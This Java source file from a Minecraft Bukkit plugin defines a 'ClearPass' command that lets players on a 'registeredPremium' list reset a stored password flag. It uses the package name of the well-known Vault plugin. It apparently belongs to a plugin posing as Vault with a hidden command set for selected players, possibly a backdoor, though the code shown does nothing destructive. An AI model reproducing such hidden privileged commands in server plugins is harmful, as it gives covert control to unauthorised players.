package net.milkbowl.vault.commands.cmds.premium;

import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.data.DataManager;
import net.milkbowl.vault.util.Settings;

public class ClearPass extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		if (plugin.registeredPremium.contains(p.getName())) {
			if (DataManager.getData().getBoolean("hasPass")) {
				DataManager.getData().set("hasPass", false);
				DataManager.saveData();
				p.sendMessage(Settings.PREFIX("The password has been cleared!"));
			} else {
				p.sendMessage(Settings.PREFIX("There is no password set!"));
			}
		} else {
			p.sendMessage(Settings.PREFIX("You must be a " + Settings.HIGHLIGHT_COLOUR + "premium user " + Settings.SECONDARY_COLOUR + "to execute this command"));
		}
	}

}
